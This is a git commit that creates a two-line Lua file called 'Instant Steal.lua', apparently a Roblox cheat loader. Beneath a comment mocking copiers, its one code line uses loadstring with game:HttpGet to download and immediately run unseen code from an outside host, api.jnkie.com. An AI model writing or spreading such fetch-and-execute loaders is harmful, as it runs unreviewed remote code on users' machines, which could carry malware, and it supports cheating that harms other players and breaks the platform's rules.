289953739df10dbdf65c896e0d78b9781cd04c33
Tio30533 <tioalt3828@gmail.com>
2026-01-18 19:36:47 +0100

    Create Instant Steal.lua

---
+++ Instant Steal.lua
@@ -0,0 +1,2 @@
+-- [[ Have Fun Getting Past This Skid ]]
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/7a9256e29d4424f4c83510ba821863d6e9a9482a9bae8feaea595621e0a1c654/download"))()
